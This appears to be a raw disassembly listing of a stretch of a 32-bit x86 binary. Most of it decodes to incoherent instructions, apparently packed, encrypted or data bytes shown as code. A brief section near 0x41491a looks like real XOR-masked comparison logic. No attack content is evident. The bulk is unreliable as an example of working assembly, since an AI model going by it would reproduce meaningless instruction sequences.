  4142b9:	cmp    al,0x3
  4142bb:	in     eax,0xac
  4142bd:	sub    ah,0xf6
  4142c0:	add    BYTE PTR [ebx+0x68],bh
  4142c3:	into   
  4142c4:	xor    eax,0xd867e564
  4142c9:	int3   
  4142ca:	das    
  4142cb:	mov    edx,0x1a6de7c2
  4142d0:	aas    
  4142d1:	out    0xa6,al
  4142d3:	sub    BYTE PTR [ecx+0x29e95299],bh
  4142d9:	mov    bl,0x49
  4142db:	and    al,0x1c
  4142dd:	sti    
  4142de:	aam    0xba
  4142e0:	int3   
  4142e1:	jl     0x414338
  4142e3:	lahf   
  4142e4:	or     esp,DWORD PTR [edx+esi*1-0x11387a2]
  4142eb:	dec    ecx
  4142ec:	xor    DWORD PTR [eax-0x342fb2e2],eax
  4142f2:	(bad)
  4142f5:	ret    
  4142f6:	jle    0x49e04c09
  4142fc:	xlat   BYTE PTR ds:[ebx]
  4142fd:	push   edi
  4142fe:	data16 mov ch,0x29
  414301:	scas   al,BYTE PTR es:[edi]
  414302:	out    dx,eax
  414303:	rcr    DWORD PTR [eiz*4-0x3cb99978],1
  41430a:	stos   BYTE PTR es:[edi],al
  41430b:	push   0x1e0f8af8
  414310:	fmul   QWORD PTR [eax-0x51]
  414313:	sub    eax,0x531f87a0
  414318:	jmp    0x414344
  41431a:	retf   0xe707
  41431d:	ins    BYTE PTR es:[edi],dx
  41431e:	dec    edi
  41431f:	ins    BYTE PTR es:[edi],dx
  414320:	pushf  
  414321:	jmp    0x562f:0x4f365ae5
  414328:	adc    ecx,edi
  41432a:	mov    ds:0xe0f76d2,eax
  41432f:	cmp    BYTE PTR [esi-0x5c1c6088],0xb
  414336:	mov    ebx,0x8bb6dfa1
  41433b:	fwait
  41433c:	in     al,dx
  41433d:	xchg   BYTE PTR [edx-0x39],dh
  414340:	into   
  414341:	sub    DWORD PTR [esi],esi
  414343:	sbb    DWORD PTR ds:0x36e16d4a,0x6e
  41434a:	sbb    DWORD PTR [ebp-0x54],0x3a590035
  414351:	jg     0x41434b
  414353:	icebp  
  414354:	(bad)  
  414355:	sbb    al,0x9
  414357:	mov    DWORD PTR [esi],ebx
  414359:	test   eax,0x3b4071d0
  41435e:	xor    cl,BYTE PTR cs:[ebx+0x54]
  414362:	dec    eax
  414363:	inc    edx
  414364:	(bad)  
  414365:	jmp    0x857c:0x77cb7cfb
  41436c:	push   0xffffffbc
  41436e:	jns    0x4143e2
  414370:	xchg   DWORD PTR [ecx+0x158e2799],ebp
  414376:	and    dh,dh
  414378:	or     bl,0x7b
  41437b:	add    eax,DWORD PTR [esi+0x10]
  41437e:	lods   eax,DWORD PTR ds:[esi]
  41437f:	jns    0x41433e
  414381:	mov    ebp,0xdb234f6e
  414386:	mov    ecx,0x1854ce1
  41438b:	mov    dl,0x5e
  41438d:	in     eax,0x3d
  41438f:	xor    ah,dl
  414391:	aas    
  414392:	sub    al,BYTE PTR [ebp-0x31]
  414395:	pop    edx
  414396:	jae    0x4143ef
  414398:	mov    ebx,0x228db9a9
  41439d:	push   edx
  41439e:	adc    DWORD PTR [edx+edx*2+0x18],esp
  4143a2:	and    al,0x6e
  4143a4:	jbe    0x4143d7
  4143a6:	lods   eax,DWORD PTR ds:[esi]
  4143a7:	out    dx,al
  4143a8:	retf   0xfd25
  4143ab:	out    dx,eax
  4143ac:	leave  
  4143ad:	and    cl,BYTE PTR [edi]
  4143af:	loop   0x414391
  4143b1:	or     al,0x57
  4143b3:	adc    ebp,esp
  4143b5:	or     eax,0x9fdf99f8
  4143ba:	out    0xba,eax
  4143bc:	int    0xfb
  4143be:	out    dx,eax
  4143bf:	inc    ebp
  4143c0:	pop    edx
  4143c1:	sbb    eax,0x5d3e167b
  4143c6:	mov    ch,0xa
  4143c8:	pop    eax
  4143c9:	pop    ss
  4143ca:	push   0x13
  4143cc:	xor    eax,DWORD PTR [edi+0xe]
  4143cf:	jae    0x41436f
  4143d1:	out    dx,al
  4143d2:	xchg   esi,eax
  4143d3:	adc    DWORD PTR [esi+0x51ee3dca],esp
  4143d9:	jl     0x414430
  4143db:	popa   
  4143dc:	ja     0x4143a0
  4143de:	fwait
  4143df:	dec    esi
  4143e0:	cmp    esi,DWORD PTR [esi-0x669988f]
  4143e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143e7:	je     0x41442b
  4143e9:	mov    DWORD PTR [edi-0x21226e40],0x6599bd35
  4143f3:	mov    bl,0x12
  4143f5:	fsubr  QWORD PTR [eax+0x24]
  4143f8:	jns    0x414465
  4143fa:	nop
  4143fb:	mov    ?,WORD PTR [ebx]
  4143fd:	or     al,0xc9
  4143ff:	scas   eax,DWORD PTR es:[edi]
  414400:	mov    edi,DWORD PTR [edi-0x56]
  414403:	(bad)  
  414404:	out    0xf9,eax
  414406:	mov    ah,0x7d
  414408:	xchg   esi,eax
  414409:	shl    DWORD PTR [edi+esi*8],0xc9
  41440d:	and    eax,0xaa8e66fa
  414412:	lea    ebp,[eax-0x135f4beb]
  414418:	sub    BYTE PTR [ecx],ah
  41441a:	and    eax,0x786923de
  41441f:	pop    esi
  414420:	popa   
  414421:	psllw  mm3,QWORD PTR [edx+0x26a57a6b]
  414428:	leave  
  414429:	sbb    bh,0x84
  41442c:	sub    DWORD PTR [ecx-0x682f0fb6],edx
  414432:	pop    es
  414433:	stc    
  414434:	std    
  414435:	xor    eax,0x1e66505f
  41443a:	idiv   ah
  41443c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41443d:	sub    BYTE PTR [ebp-0x4e],0xcf
  414441:	iret   
  414442:	add    al,BYTE PTR [ebp+0x19293573]
  414448:	fldcw  WORD PTR [edx-0x5f]
  41444b:	dec    eax
  41444c:	jo     0x414423
  41444e:	and    al,0xd2
  414450:	pusha  
  414451:	sbb    edx,DWORD PTR [eax+0x1]
  414454:	cld    
  414455:	into   
  414456:	push   esi
  414457:	add    eax,0x1b9ee5af
  41445c:	jbe    0x414404
  41445e:	in     eax,0xe5
  414460:	xchg   edi,eax
  414461:	jl     0x4144c0
  414463:	mov    al,0xca
  414465:	ins    DWORD PTR es:[edi],dx
  414466:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414467:	add    BYTE PTR [ecx],ah
  414469:	or     ecx,DWORD PTR ds:0x3a57015c
  41446f:	mov    ds:0xc73a8d30,eax
  414474:	cdq    
  414475:	int    0x83
  414477:	jmp    0x414484
  414479:	popf   
  41447a:	mov    bl,0xbc
  41447c:	int3   
  41447d:	into   
  41447e:	mov    bl,BYTE PTR [esi]
  414480:	add    al,0x2b
  414482:	hlt    
  414483:	cmp    al,0x11
  414485:	ins    DWORD PTR es:[edi],dx
  414486:	into   
  414487:	data16 or dh,BYTE PTR [edi]
  41448a:	adc    BYTE PTR ds:0x77959006,0xe
  414491:	xor    ebx,DWORD PTR [ebp-0x52]
  414494:	fdiv   QWORD PTR [ecx+0x307525ff]
  41449a:	push   ecx
  41449b:	ret    0xa50a
  41449e:	add    eax,0x9e0811cb
  4144a3:	std    
  4144a4:	iret   
  4144a5:	aad    0xe2
  4144a7:	popa   
  4144a8:	jno    0x4144f8
  4144aa:	enter  0x73de,0x5
  4144ae:	mov    edx,0x919eed57
  4144b3:	xor    eax,0x5e03a9c6
  4144b8:	or     DWORD PTR [esi-0x20335c7b],ebp
  4144be:	(bad)  
  4144c0:	fimul  DWORD PTR [ecx]
  4144c2:	xor    BYTE PTR [ebp+0x48],bl
  4144c5:	sbb    cl,BYTE PTR [edi-0x6f96aa00]
  4144cb:	push   ds
  4144cc:	xor    DWORD PTR [eax+0x6aeb7f16],ebx
  4144d2:	retf   
  4144d3:	ins    BYTE PTR es:[edi],dx
  4144d4:	xor    edx,ebp
  4144d6:	retf   
  4144d7:	outs   dx,DWORD PTR ds:[esi]
  4144d8:	cmp    al,BYTE PTR [edi+ebp*4-0x17]
  4144dc:	shl    BYTE PTR [ecx+0x40cc60e2],1
  4144e2:	jne    0x4144e8
  4144e4:	sbb    al,0x1
  4144e6:	ds jg  0x4144b9
  4144e9:	das    
  4144ea:	cs jmp 0x414554
  4144ed:	mov    ds:0x6623b13f,al
  4144f2:	movlhps xmm1,xmm3
  4144f5:	fisubr WORD PTR [ebx+0x6b]
  4144f8:	pop    es
  4144f9:	cld    
  4144fa:	add    dh,BYTE PTR [eax]
  4144fc:	into   
  4144fd:	sub    edx,DWORD PTR [ebx+0x68e39d9e]
  414503:	add    DWORD PTR [esi+edi*8],esp
  414506:	cmp    al,0x68
  414508:	je     0x414518
  41450a:	lahf   
  41450b:	out    0x70,eax
  41450d:	fs push cs
  41450f:	cmp    DWORD PTR [ecx],ecx
  414511:	mov    bh,0xaf
  414513:	in     eax,dx
  414514:	fdiv   DWORD PTR [esi+0x33]
  414517:	mov    esp,ecx
  414519:	mov    cl,0xf3
  41451b:	addr16 int 0x78
  41451e:	jmp    0x2862:0x65ae19ba
  414525:	retf   
  414526:	pusha  
  414527:	sti    
  414528:	mov    ds:0xc0b2eafc,eax
  41452d:	cli    
  41452e:	adc    eax,0xe62125c6
  414533:	push   ebx
  414534:	scas   eax,DWORD PTR es:[edi]
  414535:	xchg   edx,eax
  414536:	cmp    DWORD PTR [ebx],0x2dca1d1c
  41453c:	aad    0xfe
  41453e:	int3   
  41453f:	xor    esi,DWORD PTR [edx]
  414541:	jnp    0x41452a
  414543:	cmp    BYTE PTR [eax-0x160c5593],bh
  414549:	(bad)  
  41454a:	cmp    BYTE PTR [ecx+0x84f3eb3],ah
  414550:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414551:	jmp    0x414526
  414553:	and    ebp,DWORD PTR [ebx-0x1d]
  414556:	sahf   
  414557:	dec    esi
  414558:	jmp    0x4145a0
  41455a:	adc    eax,0xc222dfdf
  41455f:	(bad)  
  414560:	aad    0xdb
  414562:	mov    ss,WORD PTR [esi+edi*2-0x4d]
  414566:	call   0xaf447feb
  41456b:	add    BYTE PTR [esi-0x556b1497],cl
  414571:	out    0x3b,eax
  414573:	ja     0x41457a
  414575:	sahf   
  414576:	mov    ds:0x4b8fe52b,eax
  41457b:	mov    ebx,0xb6ea329
  414580:	js     0x414586
  414582:	mov    DWORD PTR [esi-0x4dc50505],ebx
  414588:	rcr    esp,1
  41458a:	sub    dl,BYTE PTR [edi-0x2ba9e3fb]
  414590:	push   esi
  414591:	cli    
  414592:	cmp    eax,0x4c1ef0aa
  414597:	sub    edi,edi
  414599:	test   al,0x51
  41459b:	sub    eax,0x5112ea34
  4145a0:	or     al,0x69
  4145a2:	out    dx,al
  4145a3:	ficomp WORD PTR [esi]
  4145a5:	out    dx,al
  4145a6:	adc    BYTE PTR [ecx-0x64e61dbc],dh
  4145ac:	test   al,0x8d
  4145ae:	or     BYTE PTR [ebx-0x5314edeb],bl
  4145b4:	add    esi,DWORD PTR [edx-0x7b313e2e]
  4145ba:	pop    ss
  4145bb:	jno    0x414615
  4145bd:	push   edx
  4145be:	mov    eax,0xacbcc229
  4145c3:	xchg   esp,eax
  4145c4:	dec    ebp
  4145c5:	ins    DWORD PTR es:[edi],dx
  4145c6:	es std 
  4145c8:	pop    ebp
  4145c9:	xchg   ebx,eax
  4145ca:	mov    cl,0x55
  4145cc:	pop    edx
  4145cd:	inc    esi
  4145ce:	fisttp QWORD PTR [esi+0x77ca2859]
  4145d4:	out    0x79,eax
  4145d6:	mov    ds:0x8d0d5880,eax
  4145db:	ds mov ebp,0x4093dfd2
  4145e1:	pop    es
  4145e2:	add    BYTE PTR [eax],ah
  4145e4:	cwde   
  4145e5:	clc    
  4145e6:	dec    ecx
  4145e7:	mov    dh,0x44
  4145e9:	ret    0xfc65
  4145ec:	jns    0x4145b4
  4145ee:	push   ebp
  4145ef:	dec    ebx
  4145f0:	pop    edi
  4145f1:	out    0xf,al
  4145f3:	pop    ss
  4145f4:	inc    esi
  4145f5:	or     esi,ecx
  4145f7:	outs   dx,BYTE PTR ds:[esi]
  4145f9:	adc    DWORD PTR [ecx+0x67],esi
  4145fc:	mov    dl,0x13
  4145fe:	pop    edx
  4145ff:	iret   
  414600:	es push edi
  414602:	jb     0x414663
  414604:	add    DWORD PTR [edx-0x48],ebx
  414607:	pop    edx
  414608:	and    al,0x46
  41460a:	test   al,ch
  41460c:	pop    ebp
  41460d:	or     ebp,DWORD PTR [esi+0x31cb7cdf]
  414613:	shr    BYTE PTR [edx+0x25fc4c49],0x8f
  41461a:	and    BYTE PTR [edi-0x9270a16],al
  414620:	ror    ah,cl
  414622:	mov    al,0xe3
  414624:	cdq    
  414625:	ret    
  414626:	mov    ch,0x31
  414628:	bound  esi,QWORD PTR [ecx]
  41462a:	(bad)  
  41462b:	mov    ds:0xdbb309e5,eax
  414630:	mov    cl,0x43
  414632:	jae    0x41460a
  414634:	rcr    DWORD PTR [ecx],cl
  414636:	sub    eax,0xfc984bc3
  41463b:	bound  esi,QWORD PTR [edx]
  41463d:	std    
  41463e:	jg     0x4145ca
  414640:	or     eax,0x3a87179a
  414645:	outs   dx,DWORD PTR ds:[esi]
  414646:	sbb    al,0x54
  414648:	or     edx,eax
  41464a:	out    dx,eax
  41464b:	mov    dh,BYTE PTR [ebx-0x44]
  41464e:	lds    eax,FWORD PTR [edx-0x17]
  414651:	ret    
  414652:	adc    DWORD PTR [edi+eax*8],0x12
  414656:	cmp    al,0xf3
  414658:	lods   eax,DWORD PTR ds:[esi]
  414659:	push   eax
  41465a:	aam    0x49
  41465c:	test   BYTE PTR [edi+0x7ac47c5d],cl
  414662:	or     DWORD PTR [eax+0x15faf692],esi
  414668:	dec    eax
  414669:	test   eax,0xae92341d
  41466e:	xchg   esi,eax
  41466f:	ja     0x4146ec
  414671:	bound  eax,QWORD PTR ss:[edx-0x6d]
  414675:	mov    cl,0x19
  414677:	push   ebx
  414678:	(bad)  
  414679:	cmp    al,0x85
  41467b:	rcr    DWORD PTR [eax],cl
  41467d:	jp     0x41463e
  41467f:	cmp    DWORD PTR [ebp+eax*4+0x30c63e50],eax
  414686:	push   edi
  414687:	jno    0x414641
  414689:	jl     0x41460b
  41468b:	xor    eax,0x6d1adda8
  414690:	repnz iret 
  414692:	repnz add eax,0x11fc0bc4
  414698:	sar    eax,1
  41469a:	pop    ds
  41469b:	leave  
  41469c:	fucom  st(5)
  41469e:	xor    esi,ebp
  4146a0:	js     0x414655
  4146a2:	xor    ecx,DWORD PTR [ebp+0xc]
  4146a5:	cmp    eax,0xb88ca471
  4146aa:	sub    eax,0x170f8a4e
  4146af:	leave  
  4146b0:	ds xchg ecx,eax
  4146b2:	into   
  4146b3:	test   al,0xfd
  4146b5:	jmp    0x41472c
  4146b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146b8:	shr    DWORD PTR [ebx],0x53
  4146bb:	and    DWORD PTR [eax],0xb232ac2e
  4146c1:	js     0x41472b
  4146c3:	dec    esp
  4146c4:	lds    eax,FWORD PTR [edx]
  4146c6:	push   edx
  4146c7:	std    
  4146c8:	(bad)  
  4146c9:	push   edi
  4146ca:	cmp    DWORD PTR [ecx-0x249cc606],esi
  4146d0:	stc    
  4146d1:	clc    
  4146d2:	out    0xa5,eax
  4146d4:	daa    
  4146d5:	stos   BYTE PTR es:[edi],al
  4146d6:	xor    edx,DWORD PTR ds:0x875c22d4
  4146dc:	push   cs
  4146dd:	mov    esp,0xce557512
  4146e2:	bswap  edx
  4146e4:	mov    dl,0x3b
  4146e6:	lods   al,BYTE PTR ds:[esi]
  4146e7:	add    BYTE PTR [ebp-0x181154db],dh
  4146ed:	jge    0x414717
  4146ef:	jmp    0x2e5c939
  4146f4:	aaa    
  4146f5:	or     DWORD PTR [edx],edi
  4146f7:	dec    edi
  4146f8:	aaa    
  4146f9:	bound  ebp,QWORD PTR [ebx+esi*1+0x6a]
  4146fd:	aaa    
  4146fe:	mov    dl,bl
  414700:	iret   
  414701:	arpl   WORD PTR [edx+0x4ab268fd],cx
  414707:	mov    ah,0x45
  414709:	xchg   esi,eax
  41470a:	scas   eax,DWORD PTR es:[edi]
  41470b:	sahf   
  41470c:	jg     0x414718
  41470e:	inc    edi
  41470f:	(bad)  
  414710:	sub    eax,0x138e1df2
  414715:	dec    ebx
  414716:	jo     0x4146fa
  414718:	and    edi,DWORD PTR [ecx-0x39]
  41471b:	jo     0x4146d2
  41471d:	cmp    DWORD PTR [esi+0x16],ecx
  414720:	cmp    BYTE PTR [esi-0x480616ac],ah
  414726:	jl     0x414759
  414728:	aas    
  414729:	stos   BYTE PTR es:[edi],al
  41472a:	and    DWORD PTR [edi-0xaeb8b25],edx
  414730:	mov    DWORD PTR [edx+0x7c],eax
  414733:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414734:	retf   
  414735:	mov    dl,0x7b
  414737:	sbb    DWORD PTR [ecx+0x20fe002b],esp
  41473d:	pop    esi
  41473e:	xor    ebx,DWORD PTR [esi+0x46]
  414741:	add    DWORD PTR [ebx-0x34],ecx
  414744:	push   ebp
  414745:	mov    esp,0xbf7021c0
  41474a:	bound  esp,QWORD PTR [ecx]
  41474c:	or     ebx,ebx
  41474e:	std    
  41474f:	xor    eax,0x3fdcd801
  414754:	dec    edx
  414755:	xchg   esp,eax
  414756:	jno    0x41478f
  414758:	push   es
  414759:	jmp    0xa800:0xa98add5d
  414760:	xchg   ecx,eax
  414761:	(bad)  
  414762:	ins    BYTE PTR es:[edi],dx
  414763:	addr16 inc esp
  414765:	mov    esp,0x79ca05e9
  41476a:	push   esp
  41476b:	mov    bh,0x9d
  41476d:	(bad)  
  41476e:	inc    ebp
  41476f:	sbb    ah,BYTE PTR [edx+0x60]
  414772:	mov    dl,BYTE PTR [ebp-0x4d]
  414775:	ins    BYTE PTR es:[edi],dx
  414776:	sub    al,BYTE PTR [esi]
  414778:	xor    al,0x2f
  41477a:	test   esp,ebx
  41477c:	adc    eax,0x7192d3b9
  414781:	pop    ebx
  414782:	das    
  414783:	test   DWORD PTR [ecx-0x5b],edi
  414786:	lock sub dl,dl
  414789:	stos   DWORD PTR es:[edi],eax
  41478a:	sbb    DWORD PTR [eax+0x280e5c2d],edx
  414790:	mov    DWORD PTR [ebx],ebp
  414792:	stc    
  414793:	dec    esi
  414794:	xchg   edi,eax
  414795:	push   ebx
  414796:	and    DWORD PTR ds:0xe86de404,edx
  41479c:	pop    ds
  41479d:	sub    ebx,ebx
  41479f:	add    edi,DWORD PTR [ebp-0x2e0fd060]
  4147a5:	call   0x4da6:0x4eaa7e32
  4147ac:	mov    esp,0xba5e1cae
  4147b1:	aas    
  4147b2:	lock push eax
  4147b4:	push   edi
  4147b5:	mov    es,WORD PTR [esi]
  4147b7:	or     eax,0x26df9539
  4147bc:	in     eax,0x93
  4147be:	fwait
  4147bf:	les    ebp,FWORD PTR cs:[eax]
  4147c2:	repnz shl cl,0x2d
  4147c6:	adc    bh,ch
  4147c8:	push   edx
  4147c9:	out    0xa1,al
  4147cb:	cwde   
  4147cc:	lea    ecx,[eax-0x5cfed0f3]
  4147d2:	jnp    0x4147f5
  4147d4:	ret    0xe963
  4147d7:	loop   0x4147a3
  4147d9:	xor    edi,DWORD PTR [edi+ecx*2]
  4147dc:	xchg   edx,eax
  4147dd:	sub    BYTE PTR [edi-0x477f9f21],ah
  4147e3:	in     al,dx
  4147e4:	imul   eax,DWORD PTR [edx+0x53],0xfffffffb
  4147e8:	test   bl,cl
  4147ea:	or     eax,0x40031f0d
  4147ef:	(bad)  
  4147f0:	pop    edi
  4147f1:	mov    dl,0x9c
  4147f3:	push   esp
  4147f4:	or     dl,BYTE PTR [eax-0x6c8ccd5a]
  4147fa:	mov    ch,0x13
  4147fc:	and    BYTE PTR [ecx-0x51],dh
  4147ff:	mov    ds:0x2c8adbd0,eax
  414804:	jle    0x4147f3
  414806:	xor    eax,0x92e8c783
  41480b:	xor    al,0x5b
  41480d:	push   cs
  41480e:	mov    ds:0xee11c1e4,al
  414813:	push   ebx
  414814:	lea    ebp,[eax*2-0xdd9dc56]
  41481b:	test   bl,dh
  41481d:	(bad)  
  41481e:	jecxz  0x414814
  414820:	(bad)  
  414821:	xchg   edx,eax
  414822:	mov    ds:0xb2071a8a,eax
  414827:	loopne 0x414896
  414829:	imul   BYTE PTR [ecx]
  41482b:	mov    DWORD PTR [ecx-0x67],ebx
  41482e:	and    BYTE PTR [edi+0x13],cl
  414831:	jmp    0x4148b1
  414833:	mov    ebx,0x1ecd5017
  414838:	out    0x27,eax
  41483a:	call   0x52ac3a92
  41483f:	cs leave 
  414841:	xchg   edx,eax
  414842:	outs   dx,BYTE PTR ds:[esi]
  414843:	cmp    DWORD PTR [edi],ebp
  414845:	loope  0x4148ae
  414847:	cli    
  414848:	sbb    eax,0xc8aa0574
  41484d:	gs mov bh,0x47
  414850:	shl    BYTE PTR [edx],cl
  414852:	hlt    
  414853:	repz jp 0x414824
  414856:	xlat   BYTE PTR ds:[ebx]
  414857:	mov    cl,0x7
  414859:	sbb    DWORD PTR [esi],0x39
  41485c:	adc    ah,BYTE PTR [eax+0x56]
  41485f:	add    BYTE PTR [ebx-0x52],dl
  414862:	lods   eax,DWORD PTR ds:[esi]
  414863:	add    al,0x5f
  414865:	or     eax,0xfd899391
  41486a:	jmp    0xcc9:0x4bf7421b
  414871:	aad    0x90
  414873:	adc    bl,BYTE PTR [edi+edx*1]
  414876:	sbb    cl,BYTE PTR [eax-0x3e38e5e7]
  41487c:	ret    0x25c
  41487f:	mov    DWORD PTR [eax+0x37fc21b4],esp
  414885:	(bad)  
  414886:	pop    ss
  414887:	mov    WORD PTR [ecx],gs
  414889:	and    eax,eax
  41488b:	and    cl,BYTE PTR [esi+edx*2-0x5bc3ff84]
  414892:	or     al,0xe
  414894:	xchg   DWORD PTR [esi+esi*2+0x4f36d431],esi
  41489b:	and    al,0x23
  41489d:	xchg   ebx,eax
  41489e:	out    0x16,al
  4148a0:	(bad)  
  4148a1:	mov    ebx,0xb8d15572
  4148a6:	test   eax,0x26b5eeb4
  4148ab:	adc    esp,ebp
  4148ad:	repz imul esi,DWORD PTR [ebx-0x1189e027],0x9958aaa0
  4148b8:	pop    edx
  4148b9:	sub    ecx,ebp
  4148bb:	les    edx,FWORD PTR [edx]
  4148bd:	mov    al,0xaf
  4148bf:	int    0x9c
  4148c1:	jbe    0x414917
  4148c3:	sbb    DWORD PTR [edi-0x219b40bb],edi
  4148c9:	jp     0x41490c
  4148cb:	ins    BYTE PTR es:[edi],dx
  4148cc:	or     al,0x93
  4148ce:	mov    ?,WORD PTR [edi+eiz*1-0x74]
  4148d2:	pusha  
  4148d3:	ja     0x4148d9
  4148d5:	mov    ah,0xc8
  4148d7:	adc    al,0xc4
  4148d9:	fsub   st,st(0)
  4148db:	mov    WORD PTR [esi],es
  4148dd:	bound  esi,QWORD PTR [edx-0x20]
  4148e0:	mov    al,0x6d
  4148e2:	push   ebp
  4148e3:	neg    DWORD PTR [eax+ebx*1-0xb]
  4148e7:	mov    ah,ch
  4148e9:	sub    dl,BYTE PTR [ebx-0x6]
  4148ec:	idiv   BYTE PTR ds:0x9352d1ff
  4148f2:	xchg   cl,ah
  4148f4:	jmp    0xc7009a03
  4148f9:	inc    edx
  4148fa:	inc    edi
  4148fb:	call   0x89942871
  414900:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414901:	outs   dx,DWORD PTR ds:[esi]
  414902:	and    ecx,DWORD PTR [eax+ebp*2-0x51]
  414906:	jae    0x414908
  414908:	dec    esi
  414909:	int3   
  41490a:	les    ecx,FWORD PTR [ecx]
  41490c:	icebp  
  41490d:	push   ecx
  41490e:	call   0x948a:0xf4558bd0
  414915:	adc    eax,0xffffff64
  41491a:	mov    bl,BYTE PTR [ebp-0x1]
  41491d:	cmp    dl,bl
  41491f:	je     0x416d50
  414925:	mov    ecx,DWORD PTR [ebp-0x5c]
  414928:	mov    edx,DWORD PTR [ebp-0xc]
  41492b:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  414932:	mov    ebx,DWORD PTR [ebp+0xc]
  414935:	xor    ecx,eax
  414937:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272fa]
  41493e:	jne    0x416e84
  414944:	mov    ecx,DWORD PTR [ebp-0x5c]
  414947:	mov    edx,DWORD PTR [ebp+0xc]
  41494a:	xor    ecx,eax
  41494c:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272fa]
  414954:	mov    edx,DWORD PTR [ebp-0x18]
  414957:	xor    edx,eax
  414959:	add    edx,esi
  41495b:	cmp    ecx,edx
  41495d:	mov    ecx,DWORD PTR [ebp-0x14]
  414960:	mov    DWORD PTR [ebp+0x8],ecx
  414963:	mov    ecx,DWORD PTR [ebp+0x8]
  414966:	je     0x416f8c
  41496c:	xor    ecx,eax
  41496e:	add    ecx,esi
  414970:	mov    ecx,0xf641bea
  414975:	je     0x416dd8
  41497b:	mov    edx,DWORD PTR [ebp+0x8]
  41497e:	jmp    0x416cd1
  414983:	outs   dx,DWORD PTR ds:[esi]
  414984:	sub    edi,DWORD PTR [ebx]
  414986:	xchg   BYTE PTR [edi],bh
  414988:	div    BYTE PTR [esi+0x72]
  41498b:	daa    
  41498c:	mov    dl,0xdf
  41498e:	mov    al,BYTE PTR [ecx]
  414990:	pop    ss
  414991:	adc    eax,0x7a944e28
  414996:	jnp    0x414949
  414998:	pushf  
  414999:	jnp    0x414a16
  41499b:	mov    ah,0xe6
  41499d:	push   ebx
  41499e:	add    eax,0x39f7483c
  4149a3:	mov    ecx,0xca56f56
  4149a8:	bound  ecx,QWORD PTR [eax]
  4149aa:	out    0xf0,eax
  4149ac:	lock jb 0x4149ee
  4149af:	test   BYTE PTR [edi+eax*1+0x3e],dl
  4149b3:	fld    TBYTE PTR [esi+0x3a]
  4149b6:	lahf   
  4149b7:	lea    esp,[edi+esi*4+0xc3f8707]
  4149be:	pop    ecx
  4149bf:	adc    ecx,DWORD PTR ds:0x4f19961c
  4149c5:	test   eax,0x6d6db526
  4149ca:	pop    es
  4149cb:	sbb    ch,cl
  4149cd:	scas   eax,DWORD PTR es:[edi]
  4149ce:	repnz add ah,BYTE PTR [eax-0x6a]
  4149d2:	add    al,0x36
  4149d4:	lods   al,BYTE PTR ds:[esi]
  4149d5:	mov    bh,BYTE PTR [ebx+edx*1]
  4149d8:	fidivr WORD PTR [edi]
  4149da:	arpl   sp,dx
  4149dc:	leave  
  4149dd:	hlt    
  4149de:	les    esp,FWORD PTR [eax]
  4149e0:	(bad)
  4149e4:	cwde   
  4149e5:	or     eax,0x4e9fedda
  4149ea:	fs gs push eax
  4149ed:	repnz add al,0xa4
  4149f0:	(bad)  
  4149f1:	mov    ds:0x52079b4e,eax
  4149f6:	jo     0x41497b
  4149f8:	fbstp  TBYTE PTR [ebx+0x23]
  4149fb:	adc    DWORD PTR [eax+0x11987d4],esi
  414a01:	icebp  
  414a02:	jmp    0x7b956d8c
  414a07:	adc    al,0x2c
  414a09:	shl    ecx,0x98
  414a0c:	sbb    BYTE PTR [edi+0x61781f87],dl
  414a12:	xchg   esp,eax
  414a13:	call   0xfd81:0x73cfcd25
  414a1a:	adc    al,BYTE PTR [edx+0x17f21165]
  414a20:	mov    al,0x1c
  414a22:	outs   dx,DWORD PTR ds:[esi]
  414a23:	push   ebx
  414a24:	pop    ecx
  414a25:	std    
  414a26:	xor    eax,0x2d0d2b4a
  414a2b:	jo     0x414a89
  414a2d:	dec    ebx
  414a2e:	xor    DWORD PTR [esi-0x38],edi
  414a31:	cmp    eax,0xb92cfd24
  414a36:	data16 pop di
  414a39:	aad    0x76
  414a3b:	jmp    0xd1cb:0xcaeb6f35
  414a42:	pop    ebp
  414a43:	xchg   esi,eax
  414a44:	test   DWORD PTR [ebx],eax
  414a46:	xor    cl,BYTE PTR [ebp-0x51e1e15b]
  414a4c:	add    eax,0x286e53ca
  414a51:	in     al,0x93
  414a53:	out    dx,eax
  414a54:	leave  
  414a55:	adc    ah,BYTE PTR [edi]
  414a57:	out    0x5a,al
  414a59:	je     0x414a3d
  414a5b:	dec    ecx
  414a5c:	(bad)  
  414a5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a5e:	adc    DWORD PTR [edi-0x7d],eax
  414a61:	bswap  esp
  414a63:	adc    al,0xeb
  414a65:	in     al,dx
  414a66:	es add al,0x0
  414a69:	ins    BYTE PTR es:[edi],dx
  414a6a:	mov    ebp,0xb40e2d77
  414a6f:	adc    ah,BYTE PTR [eax+0x64d6fd00]
  414a75:	pop    edi
  414a76:	inc    ecx
  414a77:	scas   al,BYTE PTR es:[edi]
  414a78:	xchg   ecx,eax
  414a79:	imul   BYTE PTR [ecx]
  414a7b:	and    edx,DWORD PTR [ecx]
  414a7d:	sbb    DWORD PTR [ebp-0x24],ecx
  414a80:	scas   eax,DWORD PTR es:[edi]
  414a81:	jecxz  0x414abe
  414a83:	fldcw  WORD PTR [bx+si+0x6a76]
  414a88:	arpl   WORD PTR [ebx+ecx*2],bx
  414a8b:	jae    0x414a7a
  414a8d:	in     al,0x9e
  414a8f:	push   ebp
  414a90:	xchg   ebx,eax
  414a91:	inc    ebx
  414a92:	sub    edi,DWORD PTR [edi]
  414a94:	push   ecx
  414a95:	loop   0x414a56
  414a97:	mov    al,ds:0xb9d35567
  414a9c:	adc    al,0x83
  414a9e:	jnp    0x414af5
  414aa0:	sar    DWORD PTR [edi-0x48],cl
  414aa3:	or     esi,esi
  414aa5:	call   0x7ef0:0xecf858cd
  414aac:	dec    ebp
  414aad:	stos   BYTE PTR es:[edi],al
  414aae:	mov    ebp,0xc365a127
  414ab3:	int    0xe7
  414ab5:	popa   
  414ab6:	xchg   eax,esi
  414ab8:	or     ebp,ebx
  414aba:	ret    
  414abb:	xor    ecx,DWORD PTR [edx+0x6e]
